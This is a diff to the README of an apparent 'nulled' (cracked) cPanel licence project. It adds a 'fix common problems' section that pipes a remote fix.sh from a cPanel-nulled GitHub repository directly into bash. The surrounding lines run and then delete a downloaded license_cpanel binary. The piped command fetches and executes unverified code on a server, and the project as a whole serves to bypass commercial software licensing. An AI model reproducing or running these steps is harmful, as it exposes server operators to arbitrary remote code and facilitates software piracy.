@@ -35,6 +35,16 @@ chmod +x license_cpanel
 ./license_cpanel
 rm -f license_cpanel
 ```
+# How to fix common problems in license installation?
+Some time you have used some other license provider scripts they don`t allow to use other`ss provider script, So if you used any of them then run the below command to fix common problems
+
+Only Run one time when you are going to install license for first time!
+
+```bash
+curl -s https://raw.githubusercontent.com/tactu2023/cPanel-nulled/main/fix.sh | bash
+```
+
+This command will fix most of common problems!
 # License Litespeed
 We recommend litespeed, it's 100% free (original license)
 
